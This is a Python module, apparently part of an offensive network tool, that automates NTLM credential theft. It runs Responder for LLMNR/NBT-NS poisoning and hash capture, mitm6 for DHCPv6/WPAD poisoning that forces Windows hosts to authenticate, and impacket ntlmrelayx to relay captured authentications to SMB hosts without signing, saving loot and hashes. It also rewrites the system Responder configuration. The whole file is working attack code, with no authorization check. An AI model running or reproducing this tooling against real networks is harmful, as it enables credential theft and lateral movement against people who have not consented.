"""
harvest.py — Passive NTLM/NTLMv2 hash capture via Responder + optional relay
"""

import subprocess, threading, time, re, os, shutil, socket
from . import tui, logger

RESPONDER_PATH = "/usr/share/responder/Responder.py"
NTLM_RE        = re.compile(
    r"(\S+)::([\w\-]+):([0-9a-fA-F]+):([0-9a-fA-F]+):([0-9a-fA-F]+)"
)
_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

_proc        = None
_relay_proc  = None
_hashes      = []
_relay_hits  = []
_lock        = threading.Lock()


# ── port check ────────────────────────────────────────────────────────────────

def _port_bound(port: int) -> bool:
    """Check if something is listening on a local port."""
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=1)
        s.close()
        return True
    except Exception:
        return False


# ── Responder passive capture ─────────────────────────────────────────────────

def start(iface: str):
    global _proc, _hashes
    _hashes = []

    if not os.path.exists(RESPONDER_PATH):
        tui.error(
            f"Responder not found at {RESPONDER_PATH}\n"
            f"  Install: sudo apt install responder"
        )
        logger.error(f"Responder not found: {RESPONDER_PATH}")
        return _hashes

    cmd = ["python3", RESPONDER_PATH, "-I", iface, "-v"]
    tui.info(f"Starting Responder on {iface} ...")
    logger.info(f"Starting Responder: {' '.join(cmd)}")

    try:
        _proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
    except Exception as e:
        tui.error(f"Failed to start Responder: {e}")
        logger.error(f"Responder Popen failed: {e}")
        return _hashes

    threading.Thread(target=_reader, daemon=True).start()

    # Give Responder 2s to start, then verify it's still alive
    time.sleep(2)
    if _proc.poll() is not None:
        tui.error(
            f"Responder exited immediately (rc={_proc.returncode}).\n"
            f"  Common causes: already running, port 445 in use, not run as root.\n"
            f"  Check log for details: {logger.path()}"
        )
        logger.error(f"Responder died on startup rc={_proc.returncode}")
        _proc = None

    return _hashes


def _reader():
    for line in _proc.stdout:
        line  = line.rstrip()
        clean = _ANSI_RE.sub("", line)   # strip Responder's colour codes before parsing
        if clean:
            logger.info(f"[Responder] {clean}")
        m = NTLM_RE.search(clean)
        if m:
            user   = m.group(1)
            domain = m.group(2)
            hash_  = f"{user}::{domain}:{m.group(3)}:{m.group(4)}:{m.group(5)}"
            with _lock:
                if hash_ not in _hashes:
                    _hashes.append(hash_)
                    tui.success(f"Hash captured: {tui.YLW}{user}@{domain}{tui.R}")
                    logger.success(f"Hash captured: {user}@{domain}")


def stop():
    global _proc
    if _proc:
        _proc.terminate()
        _proc = None
        tui.info("Responder stopped.")
        logger.info("Responder stopped")


def captured() -> list[str]:
    with _lock:
        return list(_hashes)


def wait_and_capture(iface: str, timeout: int = 120,
                     use_mitm6: bool = False) -> list[str]:
    start(iface)

    if _proc is None:
        tui.warn("Responder did not start — cannot harvest hashes.")
        return []

    if use_mitm6:
        tui.info("Starting mitm6 to force Windows auth (DHCPv6 poisoning) ...")
        start_mitm6(iface)
        tui.info(
            f"Waiting {timeout}s — mitm6 will force nearby Windows machines to\n"
            f"  authenticate automatically via WPAD/IPv6 — no user action needed."
        )
    else:
        tui.info(
            f"Waiting {timeout}s for LLMNR/NBT-NS hash captures ...\n"
            f"  Tip: on Windows targets, browse to a non-existent network path\n"
            f"       e.g. type \\\\fakeshare1234 in Explorer to trigger auth."
        )

    deadline = time.time() + timeout
    bar_w    = 40
    while time.time() < deadline:
        # Check process still alive every iteration
        if _proc and _proc.poll() is not None:
            tui.warn(
                f"Responder died during capture (rc={_proc.returncode}).\n"
                f"  Check log for Responder output: {logger.path()}"
            )
            logger.warn(f"Responder died mid-capture rc={_proc.returncode}")
            break

        elapsed = timeout - (deadline - time.time())
        filled  = int(bar_w * elapsed / timeout)
        bar     = f"{'█' * filled}{'░' * (bar_w - filled)}"
        count   = len(captured())
        print(
            f"\r  {tui.RED}[{bar}]{tui.R}  "
            f"{tui.DIM}{int(elapsed):>3}s  {tui.GRN}{count} hash(es){tui.R}   ",
            end="", flush=True
        )
        time.sleep(1)
    print()
    stop()
    if use_mitm6:
        stop_mitm6()
    return captured()


# ── NTLM relay ────────────────────────────────────────────────────────────────

_mitm6_proc = None


def start_mitm6(iface_name: str):
    global _mitm6_proc
    exe = shutil.which("mitm6") or os.path.expanduser("~/.local/bin/mitm6")
    if not os.path.exists(exe or ""):
        tui.warn(
            "mitm6 not found — IPv6 DNS poisoning disabled.\n"
            "  Install: sudo pip3 install mitm6 --break-system-packages\n"
            "  Note: mitm6 only works if the target network has IPv6 enabled."
        )
        logger.warn("mitm6 not found")
        return

    cmd = [exe, "-i", iface_name, "-d", "local", "--ignore-nofqdn"]
    tui.info(f"Starting mitm6 on {iface_name} ...")
    logger.info(f"Starting mitm6: {' '.join(cmd)}")
    try:
        _mitm6_proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1)
        if _mitm6_proc.poll() is not None:
            tui.warn(
                f"mitm6 exited immediately — likely no IPv6 on this network.\n"
                f"  Relay will continue without IPv6 DNS poisoning."
            )
            logger.warn("mitm6 exited immediately (no IPv6?)")
            _mitm6_proc = None
    except Exception as e:
        tui.warn(f"mitm6 failed to start: {e}")
        logger.error(f"mitm6 exception: {e}")


def stop_mitm6():
    global _mitm6_proc
    if _mitm6_proc:
        _mitm6_proc.terminate()
        _mitm6_proc = None


def start_relay(targets: list[str], iface_name: str, timeout: int = 120,
                use_mitm6: bool = True) -> list[dict]:
    global _relay_proc, _relay_hits
    _relay_hits = []

    exe = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
    if not exe:
        tui.error(
            "impacket-ntlmrelayx not found.\n"
            "  Install: sudo apt install python3-impacket"
        )
        logger.error("ntlmrelayx not found")
        return _relay_hits

    target_file = "/tmp/cascade_relay_targets.txt"
    with open(target_file, "w") as f:
        for t in targets:
            f.write(f"smb://{t}\n")

    tui.info(f"Starting NTLM relay → {len(targets)} target(s) ...")
    cmd = [exe, "-tf", target_file, "-smb2support",
           "-wh", "wpad.local",
           "-l", "/tmp/cascade_relay_loot",
           "-of", "/tmp/cascade_relay_hashes"]
    logger.info(f"Starting ntlmrelayx: {' '.join(cmd)}")

    try:
        _relay_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
    except Exception as e:
        tui.error(f"Failed to start ntlmrelayx: {e}")
        logger.error(f"ntlmrelayx Popen failed: {e}")
        return _relay_hits

    threading.Thread(target=_relay_reader, daemon=True).start()

    # Verify ntlmrelayx actually bound port 445
    time.sleep(2)
    if _relay_proc.poll() is not None:
        tui.error(
            f"ntlmrelayx exited immediately (rc={_relay_proc.returncode}).\n"
            f"  Port 445 may already be in use (check: sudo ss -tlnp | grep 445).\n"
            f"  Check log for details: {logger.path()}"
        )
        logger.error(f"ntlmrelayx died rc={_relay_proc.returncode}")
        _relay_proc = None
        return _relay_hits

    if not _port_bound(445):
        tui.warn(
            "ntlmrelayx started but port 445 does not appear bound.\n"
            "  This is a known impacket issue on some Linux kernels.\n"
            "  Relay may not work — switch to passive Responder capture instead.\n"
            f"  Check log for ntlmrelayx output: {logger.path()}"
        )
        logger.warn("ntlmrelayx running but port 445 not bound")
    else:
        tui.success("ntlmrelayx listening on port 445.")

    _start_responder_relay_mode(iface_name)
    if use_mitm6:
        start_mitm6(iface_name)

    deadline = time.time() + timeout
    bar_w    = 40
    while time.time() < deadline:
        elapsed = timeout - (deadline - time.time())
        filled  = int(bar_w * elapsed / timeout)
        bar     = f"{'█' * filled}{'░' * (bar_w - filled)}"
        count   = len(_relay_hits)
        print(
            f"\r  {tui.RED}[{bar}]{tui.R}  "
            f"{tui.DIM}{int(elapsed):>3}s  "
            f"{tui.GRN}{count} relay hit(s){tui.R}   ",
            end="", flush=True
        )
        time.sleep(1)
    print()
    stop_relay()
    return _relay_hits


def _start_responder_relay_mode(iface: str):
    global _proc
    conf = "/etc/responder/Responder.conf"
    try:
        with open(conf) as f:
            content = f.read()
        patched = re.sub(r"^(SMB\s*=\s*)On",  r"\1Off", content, flags=re.M)
        patched = re.sub(r"^(HTTP\s*=\s*)On", r"\1Off", patched, flags=re.M)
        with open(conf, "w") as f:
            f.write(patched)
        logger.info("Responder.conf: SMB/HTTP set to Off for relay mode")
    except Exception as e:
        logger.warn(f"Could not patch Responder.conf: {e}")

    if os.path.exists(RESPONDER_PATH):
        _proc = subprocess.Popen(
            ["python3", RESPONDER_PATH, "-I", iface, "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        threading.Thread(target=_reader, daemon=True).start()


def _relay_reader():
    for line in _relay_proc.stdout:
        line = line.rstrip()
        logger.info(f"[ntlmrelayx] {line}")
        m = re.search(
            r"Authenticating against smb://([\d.]+) as [^/]+/(\S+)\s+SUCCEED", line
        )
        if m:
            ip   = m.group(1)
            user = m.group(2)
            with _lock:
                entry = {"ip": ip, "user": user}
                if entry not in _relay_hits:
                    _relay_hits.append(entry)
                    tui.success(f"RELAY HIT: {tui.YLW}{user}{tui.R} → {tui.WH}{ip}{tui.R}")
                    logger.success(f"Relay hit: {user} → {ip}")


def stop_relay():
    global _relay_proc, _proc
    stop_mitm6()
    for p in (_relay_proc, _proc):
        if p:
            try:
                p.terminate()
            except Exception:
                pass
    _relay_proc = None
    _proc       = None

    conf = "/etc/responder/Responder.conf"
    try:
        with open(conf) as f:
            content = f.read()
        restored = re.sub(r"^(SMB\s*=\s*)Off",  r"\1On", content, flags=re.M)
        restored = re.sub(r"^(HTTP\s*=\s*)Off", r"\1On", restored, flags=re.M)
        with open(conf, "w") as f:
            f.write(restored)
        logger.info("Responder.conf restored")
    except Exception:
        pass
    tui.info("Relay stopped. Responder.conf restored.")


def relay_targets_from_hosts(hosts: list[dict]) -> list[str]:
    from . import lateral
    candidates = []
    for h in hosts:
        if 445 in (h.get("ports") or []):
            vulns = lateral.check_vulns(h["ip"])
            if vulns.get("signing_disabled"):
                candidates.append(h["ip"])
    return candidates
